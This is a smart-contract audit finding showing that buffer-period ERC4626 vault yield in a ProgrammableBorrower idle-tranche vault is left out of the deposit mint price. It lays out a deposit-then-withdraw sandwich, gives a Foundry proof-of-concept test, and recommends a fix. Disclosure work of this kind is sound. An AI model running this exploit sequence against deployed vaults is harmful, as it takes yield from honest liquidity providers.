### Title
Unpriced buffer-period ERC4626 vault yield lets a lender sandwich `stopEpoch` and dilute existing LPs - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
In the programmable-borrower mode, all idle funds are parked in an external ERC4626 vault. Vault yield that accrues during the buffer period is intentionally deferred: `onStartEpoch` stores it as `bufferedVaultDelta` and it is only realized into tranche NAV at the *next* `stopEpoch`. Because `depositAA`/`depositBB` remain open during the buffer and mint shares at the stale `virtualPrice`, a KYC'd lender can deposit at the end of the buffer — after the yield has already accrued in the vault but before it is priced in — then withdraw in the following buffer at the post-realization price, capturing a pro-rata share of yield earned entirely by prior LPs. This is the idle-tranches analog of the Bunni surge-fee gap: a share-price increase that is not checked against deposit/redemption entry.

### Finding Description
`ProgrammableBorrower.onStartEpoch` computes `bufferedVaultDelta = _currentVaultAssets() - bufferStartVaultAssets` and folds it into the next epoch's PnL via `_vaultNetInterest`, which feeds `totalInterestDueNow` [1](#0-0) . That delta becomes tranche-price appreciation only when the manager later calls `stopEpoch`, which runs `_updateAccounting` [2](#0-1) .

Meanwhile, during the buffer period the CDO is unpaused, so `depositAA`/`depositBB` are callable by any `isWalletAllowed` lender and mint at `virtualPrice`, which still reflects the last settled NAV — it does not include the pending buffered vault yield [3](#0-2) . `_skimDonatedAssets` only removes raw token donations; it cannot correct a stale mint price caused by external-vault share appreciation [4](#0-3) . `depositDuringEpoch` is disabled in programmable mode (`isProgrammableBorrower` check), leaving the buffer window as the only deposit path — and it has no pricing adjustment for the deferred delta [5](#0-4) .

Attack sequence (buffer → running → stopped → buffer):
1. Epoch N stops; buffer begins. Vault keeps earning yield; `bufferStartVaultAssets` was snapshotted in `onStopEpoch` [6](#0-5) .
2. Attacker (KYC-passing lender) waits until yield Y has accrued in the vault, then calls `depositAA(D)` at the stale `virtualPrice` — minting shares as if Y did not exist.
3. Manager calls `startEpoch` → `onStartEpoch` carries `bufferedVaultDelta ≈ Y` into epoch N+1, and deposits attacker's funds into the vault.
4. Epoch N+1 runs (APR0 programmable mode). Manager calls `stopEpoch`; `_updateAccounting` realizes `totalInterestDueNow` including Y, lifting `virtualPrice` for every tranche token — including the attacker's cheaply minted ones.
5. In buffer N+1, attacker calls `requestWithdraw` and `claimWithdrawRequest` at the inflated price.

Profit ≈ `Y · D / (TVL + D)`, paid for by diluting the LPs who actually earned Y. The fair-mint invariant is broken: mint price ignores realizable external-vault PnL known to the contracts but not yet checkpointed into NAV.

### Impact Explanation
Direct theft via dilution of unclaimed yield. With a long buffer (e.g., the tested `bufferPeriod` during which Morpho vault yield accrues — see `testProgrammableBorrowerBufferVaultYieldIsRealizedAtNextStop` confirming buffer yield lifts AA price only at the next stop), Y can be a meaningful fraction of epoch returns. An attacker sizing D ≈ TVL captures ~50% of Y; the loss to honest LPs equals the attacker's gain [7](#0-6) .

### Likelihood Explanation
Requires only an unprivileged whitelisted lender, normal manager `startEpoch`/`stopEpoch` sequencing, and a buffer long enough for the ERC4626 vault to accrue visible yield. No privileged collusion needed — `bufferedVaultDelta` accrual is deterministic and publicly observable on-chain (`_currentVaultAssets` vs `bufferStartVaultAssets`), so the timing window is trivially detectable. No existing guard helps: skim only covers raw donations, `depositDuringEpoch` gating doesn't apply to buffer deposits, and there is no surge/pricing-freshness check on deposits.

### Recommendation
Include pending buffer vault PnL in the deposit mint price during the buffer (e.g., compute `virtualPrice` off `lastNAV + bufferedVaultDelta`, or checkpoint `bufferedVaultDelta` into NAV at the start of the buffer / on each deposit). Alternatively, disallow direct deposits during the buffer and force them through `epochPendingDeposits`, minting only after the yield is realized at `startEpoch`/`stopEpoch` prices — mirroring the queue's `processDeposits` epoch-price mechanism [8](#0-7) .

### Proof of Concept
Foundry fork PoC, modeled on `test/foundry/ProgrammableBorrowerCreditVault.t.sol` (real Morpho vault via `_accrueMorphoVaultInterest`):

```solidity
// test/foundry/ProgrammableBorrowerBufferYieldSandwich.t.sol
function testBufferYieldSandwich() external {
    uint256 lpAmount  = 100_000 * oneScale;
    uint256 atkAmount = 100_000 * oneScale;
    address attacker = makeAddr("attacker");

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);
    deal(USDC, attacker, atkAmount, true);
    vm.prank(attacker);
    underlying.approve(address(cdoEpoch), type(uint256).max);

    // honest LP deposits, epoch 0 runs and stops -> buffer begins
    idleCDO.depositAA(lpAmount);
    _startEpochAndCheckPrices(0);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // buffer period: vault accrues yield Y (not yet in virtualPrice)
    vm.warp(cdoEpoch.epochEndDate() + cdoEpoch.bufferPeriod() + 1);
    _accrueMorphoVaultInterest();
    uint256 bufferYield = _programmableVaultAssets() -
        programmableBorrower.bufferStartVaultAssets();
    assertGt(bufferYield, 0);

    // attacker sandwiches: deposit at stale price just before startEpoch
    uint256 pricePre = cdoEpoch.virtualPrice(address(aaTranche));
    vm.prank(attacker);
    uint256 atkShares = cdoEpoch.depositAA(atkAmount);

    // epoch 1 runs with APR0, then stops -> bufferedVaultDelta realized
    vm.prank(manager);
    cdoEpoch.startEpoch();
    vm.warp(cdoEpoch.epochEndDate() + 1);
    _accrueMorphoVaultInterest();
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    uint256 pricePost = cdoEpoch.virtualPrice(address(aaTranche));
    assertGt(pricePost, pricePre, "buffer yield realized");

    // attacker exits in buffer 1 at the inflated price
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(atkShares, address(aaTranche));
    vm.prank(manager);
    cdoEpoch.startEpoch();           // processes pending withdraws
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();

    uint256 atkOut = underlying.balanceOf(attacker) - balPre;
    // attacker deposited `atkAmount`; expected fair exit (APR0) ≈ atkAmount.
    // Actual exit ≈ atkAmount + bufferYield * atkShares/totalSupply (dilution gain).
    assertGt(atkOut, atkAmount, "attacker captured buffer yield without earning it");
}
```

Expected: `atkOut - atkAmount` approximates `bufferYield * atkAmount / (lpAmount + atkAmount)` (≈ 50% of `bufferYield` at equal deposits), quantifying the LP dilution. Caveat: I did not fully trace whether `requestWithdraw` locks the claim price at request time or claim time; if it locks at request time, the attacker simply requests after `stopEpoch` N+1 (price already inflated), which does not change the attack, only the exact claim timing.

  function testProgrammableBorrowerBufferVaultYieldIsRealizedAtNextStop() external {
    uint256 amount = 10_000 * oneScale;

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    idleCDO.depositAA(amount);
    _startEpochAndCheckPrices(0);

    vm.warp(cdoEpoch.epochEndDate() + 1);

    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    uint256 priceAfterEpoch0Stop = cdoEpoch.virtualPrice(address(aaTranche));
    uint256 vaultAssetsAfterEpoch0Stop = _programmableVaultAssets();

    vm.warp(cdoEpoch.epochEndDate() + cdoEpoch.bufferPeriod() + 1);
    _accrueMorphoVaultInterest();

    uint256 bufferVaultYield = _programmableVaultAssets() - vaultAssetsAfterEpoch0Stop;
    assertGt(bufferVaultYield, 0, "expected vault yield during the buffer");

    uint256 aaPricePre = cdoEpoch.virtualPrice(address(aaTranche));
    uint256 bbPricePre = cdoEpoch.virtualPrice(address(bbTranche));

    vm.prank(manager);
    cdoEpoch.startEpoch();

    assertApproxEqAbs(cdoEpoch.virtualPrice(address(aaTranche)), aaPricePre, 1, "AA price changed on start: 1");
    assertApproxEqAbs(cdoEpoch.virtualPrice(address(bbTranche)), bbPricePre, 1, "BB price changed on start: 1");

    assertApproxEqAbs(
      programmableBorrower.vaultInterestAccrued(),
      bufferVaultYield,
      20,
      "buffer vault yield should remain pending after the next epoch starts"
    );

    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 expectedEpoch1Interest = programmableBorrower.totalInterestDueNow();
    assertGe(expectedEpoch1Interest, bufferVaultYield, "buffer vault yield should still contribute before the next stop");

    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    assertGe(cdoEpoch.lastEpochInterest(), bufferVaultYield, "buffer vault yield should be realized at next stop");
    assertGt(
      cdoEpoch.virtualPrice(address(aaTranche)),
      priceAfterEpoch0Stop,
      "AA tranche price should increase once the buffered vault yield is realized"
    );

  function processDeposits() external {
    // only owner or strategy manager can process deposits
    _checkOnlyOwnerOrManager();
    // prefunded-enabled queues do not use the old buffer-period processing path
    _checkNotAllowed(_isPrefundedQueueEnabled());

    IdleCDOEpochVariant _cdo = IdleCDOEpochVariant(idleCDOEpoch);
    uint256 _epoch = IdleCreditVault(strategy).epochNumber();
    uint256 _pending = epochPendingDeposits[_epoch];

    if (_pending == 0) {
      return;
    }

    // deposit underlyings in the CDO contract, if the epoch is running it will revert
    uint256 _trancheMinted;
    if (tranche == _cdo.AATranche()) {
      _trancheMinted = _cdo.depositAA(_pending);
    } else {
      _trancheMinted = _cdo.depositBB(_pending);
    }
    // save current implied tranche price for this epoch based on underlyings deposited and tranche tokens minted
    epochPrice[_epoch] = _pending * ONE_TRANCHE / _trancheMinted;
    epochPendingDeposits[_epoch] = 0;
  }
